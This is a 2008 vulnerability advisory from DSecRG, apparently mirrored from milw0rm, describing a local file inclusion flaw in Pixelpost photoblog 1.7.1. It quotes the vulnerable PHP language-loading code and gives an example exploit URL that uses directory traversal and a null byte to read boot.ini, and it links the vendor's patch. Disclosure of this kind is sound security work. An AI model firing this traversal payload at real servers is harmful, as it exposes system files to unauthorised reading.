<html><head><title>PixelPost 1.7.1 (language_full) Local File Inclusion Vulnerability</title></head><pre>Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-033


Application:                    Pixelpost photoblog
Versions Affected:              1.7.1
Vendor URL:                     http://www.pixelpost.org/
Bug:                            Local File Include
Exploits:                       YES
Reported:                       22.07.2008
Vendor response:                23.07.2008
Solution:                       YES
Date of Public Advisory:        28.07.2008
Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)



Description
***********

Pixelpost photoblog has local file include vulnerability in script index.php

Successful exploitation requires that &quot;register_globals&quot; is enabled.

Code
****
#################################################

$PP_supp_lang = array('dutch'=&gt;array('NL','Nederlands'),
                                          'english'=&gt;array('EN','English'),
                                          'french'=&gt;array('FR','Francais'),
                                          'german'=&gt;array('DE','Deutsch'),
                                          'italian'=&gt;array('IT','Italiano'),
                                          'norwegian'=&gt;array('NO','Norsk'),
                                          'persian'=&gt;array('FA','Farsi'),
                                          'polish'=&gt;array('PL','Polskiego'),
                                          'portuguese'=&gt;array('PT','Portugues'),
                                          'simplified_chinese'=&gt;array('CN','Chinese'),
                                          'spanish'=&gt;array('ES','Espanol'),
                                          'swedish'=&gt;array('SE','Svenska'),
                                          'danish'=&gt;array('DK','Dansk'),
                                          'japanese'=&gt;array('JP','Japanese'),
                                          'hungarian'=&gt;array('HU','Magyar'),
                                          'romanian'=&gt;array('RO','Romana'),
                                          'russian'=&gt;array('RU','Russian'),
                                          'czech'=&gt;array('CS','Cesky')
                                         );
...
if(isset($_GET['lang'])) { $language_abr = substr($_GET['lang'],0,2); }

foreach ($PP_supp_lang as $key =&gt; $row) {
        foreach($row as $cell){
                if ($cell == strtoupper($language_abr)) { $language_full = $key; }
        }
}
...
if(!empty($language_full)) {
        if(file_exists(&quot;language/lang-&quot;.$language_full.&quot;.php&quot;)) {

                if( !isset($_GET['x'])OR($_GET['x'] != &quot;rss&quot; &amp; $_GET['x'] != &quot;atom&quot;)) {
                        require(&quot;language/lang-&quot;.$language_full.&quot;.php&quot;);
                }
        }else{
        ...

#################################################

Example:

http://[server]/[installdir]/index.php?lang=DSecRG&amp;language_full=../../../../../../../../../../../../../boot.ini%00



Solution
********

Vendor fix this flaw on 27.07.2008. Security Patch can be downloaded here:

http://www.pixelpost.org/blog/2008/07/27/pixelpost-171-security-patch/



About
*****

Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.


Contact:    research [at] dsec [dot] ru
            http://www.dsec.ru (in Russian)

# milw0rm.com [2008-07-28]</pre></html>